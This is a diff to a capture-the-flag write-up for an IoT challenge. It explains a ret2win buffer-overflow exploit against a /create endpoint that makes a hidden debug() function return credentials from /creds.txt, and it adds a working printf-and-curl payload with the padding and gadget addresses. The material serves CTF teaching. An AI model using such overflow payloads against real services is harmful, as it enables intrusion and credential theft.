@@ -93,6 +93,13 @@ Author: [@Legoclones](https://twitter.com/legoclones)
 ### Solution:
 The last flag is hidden in the MySQL database with unguessable credentials. The only way to get those credentials is to read `/creds.txt`. There is a function inside `api.c` which will print it out for "debugging" purposes, but that function is never called. Instead, the unfinished `/create` endpoint called `create_note`, which has a buffer overflow. A simple `ret2win` (or `ret2debug`) can be used to return the credentials and access the flag. 
 
-Since Python doesn't exist on the IoT box (and can't be installed), a `curl` command or C binary will have to suffice for delivering the exploit.
+Since Python doesn't exist on the IoT box (and can't be installed), a `curl` command or C binary will have to suffice for delivering the exploit. It's a simple `ret2win`, where you have to find the padding (280 bytes) for the overflow, then the address for a `ret` gadget (to ensure no segfault for printf), then the address for `debug()`. This will return the credentials in the HTTP response.
 
-?PoC?
+A proof of concept using `curl` is below:
+
+```bash
+printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x16\x10@\x00\x00\x00\x00\x00[\x16@\x00\x00\x00\x00\x00' > /tmp/out
+curl http://<IP>/api/create -H 'Cookie: session=ed3f2d85696656f4ea64a0f1d5ceb399' --data-binary @/tmp/out
+```
+
+The original Python pwntools solution I used (which doesn't work in this infrastructure) is located at `solve/solve.py`.
